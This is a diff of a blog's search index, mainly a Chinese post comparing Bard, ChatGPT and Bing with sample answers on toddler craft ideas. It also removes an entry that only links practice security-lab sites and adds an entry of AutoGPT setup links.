还可以用于语言理解、自然语言推理、文本分类、命名实体识别等自然语言处理任务。</p><p>差异：</p><p>1.目前bard只对美国和英国开放，且回答的问题也仅限于英文，所以相对局限，从之前在网上看到已经注册且使用bard分享的人的经验来看，bard回答问题相对靠谱，如果无法解释这个问题，那么将不回答这个问题，但是chatgpt始终会给你一个答案，但是两者在算数题上的能力都相对较差，着不知道是机器学习的通病还是什么，总之数学计算好像和我们刻板中老外计算能力不太强有关。</p><p>因为数据库的问题，目前chatgpt依旧不能回答有关bard的问题，像下面这个例子：</p><p>Q:google bard 已经发布你会担心他击败你吗？<br>A::作为一名 AI 语言模型，我没有情感和自我意识，也不会感到担心或者恐惧。我被设计用于处理自然语言任务，并且始终会尽力提供最准确、最有用的答案和回复。</p><p>Google BART 是一种优秀的自然语言处理模型，它采用了类似于我使用的 Transformer 架构，并且在多个自然语言任务上表现出色。然而，这并不意味着 BART 会取代我或取代其他语言模型，因为每种模型都有其独特的优点和适用场景。</p><p>在自然语言处理领域，研究和开发不断推动着技术的进步，各种新的模型和算法也不断涌现。我相信这将会使得自然语言处理技术越来越强大和普及，从而更好地服务于人类社会。<br>2.bard可以进行联网回答，而不局限于数据库，所以这个是bard相比利用数据库进行模拟AI的话根据有时效性，这也可能是bard的实现弯道超车的一个重要因素。但是如果你用具体自己写的英文博客去让BARD分析，那么结果会不太相符，也就是说，BARD所给出的回答仅仅停留在表面上，并无法深入到具体博客内容来进行直观分析，大多是根据文章名称直接编造的。仅能回答类似于今天某一只股票的具体价格显而易见的结果。</p><p>3.bard无法帮助写程序，但是chatgpt可以帮助你辅助写一些程序，但是前提是我们还是要有一些编程基础，否则代码可能无法正常运行，大多数时候给出的结果也不是非常好，之前我谢过一篇，可以查看以下链接关于生物量计算的代码分析：</p><p>用chatgpt帮你写一段GEE计算森林生物量的代码，你猜结果如何？_此星光明的博客-CSDN博客</p><p>测试：</p><p>问题：</p><p>请推荐一些为1周岁至3周岁孩子作手工的点子和详细说明。制作材料仅限于纸盒、塑料瓶、纸和细绳。</p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/03/image-1024x535.png" alt="img"></p><p>bing：</p><p>这是必应。我可以帮你推荐一些为1周岁至3周岁孩子作手工的点子和详细说明。制作材料仅限于纸盒、塑料瓶、纸和细绳。😊</p><ul><li>你可以用纸盒和纸折出一个简单的纸盒，然后用细绳或者胶带把它固定好，就可以作为一个小玩具或者收纳盒²。如果你想让它更有趣，你可以在纸盒上画上一些图案或者贴上一些装饰物，比如眼睛、鼻子、嘴巴等，就可以变成一个可爱的动物或者人物¹。</li><li>你也可以用塑料瓶和纸做一些有创意的手工，比如：</li><li>用塑料瓶的底部剪出一些花瓣的形状，然后用胶水粘在一起，就可以做出一个漂亮的花朵⁴。你可以用不同颜色的塑料瓶来制作不同的花朵，然后用细绳串起来，挂在墙上或者窗户上，就可以作为一个美丽的装饰品⁵。</li><li>用塑料瓶的中间部分剪出一个圆筒的形状，然后在上面画上一些图案或者贴上一些装饰物，就可以做出一个创意的灯罩⁴。你可以用一个小灯泡或者一个手电筒放在里面，就可以制作出一个独一无二的灯具⁵。</li><li>用塑料瓶的上部剪出一个小口的形状，然后在上面画上一些图案或者贴上一些装饰物，就可以做出一个可爱的动物盆栽⁴。你可以在里面放一些土壤和植物，或者用塑料瓶的底部剪出一些绿色的叶子，就可以制作出一个小绿植⁵。</li><li>这些手工都是很简单又有趣的，可以让孩子们锻炼手眼协调和创造力，也可以让他们学习环保的意识，把废弃的材料变成有用的东西⁵。希望你和孩子们玩得开心！</li></ul><p>Source: Conversation with Bing, 2023&#x2F;3&#x2F;27(1) 垃圾纸盒怎么折？-百度经验. <a href="https://jingyan.baidu.com/article/2c8c281dd85db80008252ad5.html">https://jingyan.baidu.com/article/2c8c281dd85db80008252ad5.html</a> Accessed 2023&#x2F;3&#x2F;27.<br>(2) 如何折纸盒: 12 步骤（包含图片）. <a href="https://zh.wikihow.com/%E6%8A%98%E7%BA%B8%E7%9B%92">https://zh.wikihow.com/%E6%8A%98%E7%BA%B8%E7%9B%92</a> Accessed 2023&#x2F;3&#x2F;27.<br>(3) 有什么有意思的塑料瓶DIY作品？ – 知乎. <a href="https://www.zhihu.com/question/26676414">https://www.zhihu.com/question/26676414</a> Accessed 2023&#x2F;3&#x2F;27.<br>(4) 变废为宝丨DIY环保创意手工，给塑料瓶以新生！ – 知乎. <a href="https://zhuanlan.zhihu.com/p/445195700">https://zhuanlan.zhihu.com/p/445195700</a> Accessed 2023&#x2F;3&#x2F;27.<br>(5) 包装纸盒的材质种类有哪些 – 知乎. <a href="https://zhuanlan.zhihu.com/p/365311908">https://zhuanlan.zhihu.com/p/365311908</a> Accessed 2023&#x2F;3&#x2F;27.<br>(6) 瓶子底下PET1是什么类型的塑料瓶 ？_百度知道. <a href="https://zhidao.baidu.com/question/257958749.html">https://zhidao.baidu.com/question/257958749.html</a> Accessed 2023&#x2F;3&#x2F;27.</p><p>chatgpt回答：</p><p>以下是一些适合1岁至3岁儿童制作的手工点子，这些点子只需要使用纸盒、塑料瓶、纸和细绳等常见材料：</p><ol><li>纸板盒子火车：将一个大的纸板盒子涂上颜色或包上彩色纸，然后在盒子上粘上圆形纸板作为车轮。接着将一个小的纸板盒子装满小物品，然后用彩色纸和细绳把小盒子粘到大盒子上，制作出一个可爱的火车。</li><li>水瓶花瓶：用干净的塑料瓶制作一个花瓶。将塑料瓶的标签去掉，然后把它用漂亮的彩色纸包起来。你可以让孩子参与在纸上画画，然后贴到瓶子上。最后，将水加入瓶子中，就可以放上鲜花了。</li><li>纸板盒子玩具房子：将纸板盒子的盖子剪掉，然后将盒子涂上颜色或包上彩色纸，制作出一个小房子。可以用剪纸、贴纸等方式装饰房子。孩子可以在里面放置小玩具、玩偶等，享受自己的私人空间。</li><li>纸制拼图：将一张大的白纸分成数个小格子，并在每个格子中画上简单的图案，例如水果、动物等。然后将纸剪成相同大小的小块，孩子可以将它们拼成一张完整的图片。这个活动可以锻炼孩子的手眼协调和认知能力。</li><li>纸盘风车：将一张白纸剪成一个圆形，并将它折叠成四等分。接着，在每个小三角形的中心打一个小洞，用细绳将纸盘固定在一个竹签或者铅笔上。最后，在每个小三角形的顶部贴上小纸条，形成风车的叶片。当风吹过时，孩子就可以看到风车旋转了。</li></ol><p>以上这些手工制作点子可以提高孩子的创造力和想象力，同时锻炼他们的手部协调能力和认知能力。在做这些手工制作点子时，需要成年人的帮助和监督。<br>我们可以看出bing的互联网让你可以更具体的访问到具体的界面产看具体的制作方法，但是chatgpt仅仅通过告诉你如何做，并无法获取更多额外的延伸。目前Bing国内版本好像暂时无法像上面再浏览器一侧有具体的智能回答，所以这里智能耐心等待，上图是我在英国测试的结果。</p>]]></content>
+      
+      
       <categories>
-        <category>Web</category>
+          
+          <category> 实用分享 </category>
+          
       </categories>
-      <tags>
-        <tag>Google镜像</tag>
-        <tag>vercel</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶场篇</title>
-    <url>/2023/07/22/%E9%9D%B6%E5%9C%BA%E7%AF%87/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>DSVW、DVWA、vulhub、vulstudy、XSS-game、WebGoat</p>
-<span id="more"></span>
-
-<p><strong>1、DSVW</strong></p>
-<p><a href="https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW">https://github.com/MyKings/docker-vulnerability-environment/tree/master/DSVW</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-14.png" alt="图片"></p>
-<p><strong>2、DVWA</strong></p>
-<p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-15.png" alt="图片"></p>
-<p><strong>3、vulhub</strong></p>
-<p><a href="https://vulhub.org/#/docs/install-docker-one-click/">https://vulhub.org/#/docs/install-docker-one-click/</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-16.png" alt="图片"></p>
-<p><strong>4、vulstudy</strong></p>
-<p><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-17.png" alt="图片"></p>
-<p><strong>5、XSS – game</strong></p>
-<p><a href="https://xss.haozi.me/#/0x00">https://xss.haozi.me/#/0x00</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-18.png" alt="图片"></p>
-<p><a href="http://www.domxss.com/domxss/domxss.php">http://www.domxss.com/domxss/domxss.php</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-19.png" alt="图片"></p>
-<p><a href="http://prompt.ml/0">http://prompt.ml/0</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-20.png" alt="图片"></p>
-<p>6、WebGoat</p>
-<p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
-<p><img src="https://cdn.alone-hk.cn/img/blog/img/uploads/2022/08/unnamed-file-21.png" alt="图片"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> bard </tag>
+            
+            <tag> Chatgpt </tag>
+            
+            <tag> new bing </tag>
+            
+            <tag> 文心一言 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>什么是全自动 AI？AutoGPT 安装部署使用教程</title>
+      <link href="/2023/07/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E8%87%AA%E5%8A%A8-AI%EF%BC%9F/"/>
+      <url>/2023/07/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E8%87%AA%E5%8A%A8-AI%EF%BC%9F/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>AutoGPT 安装部署使用教程</p><span id="more"></span><p>视频教程:</p><p>AgentGPT: <a href="https://agentgpt.reworkd.ai/">https://agentgpt.reworkd.ai/</a></p><p>AutoGPT 安装指令: <a href="https://github.com/Significant-Gravitas/Auto-GPT">https://github.com/Significant-Gravitas/Auto-GPT</a></p><p>OpenAI API Key: <a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p><p>Pinecone API Key: <a href="https://app.pinecone.io/organizations">https://app.pinecone.io/organizations</a></p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 实用分享 </category>
+          
       </categories>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> ai </tag>
+            
+            <tag> AutoGPT </tag>
+            
+            <tag> 人工智能 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
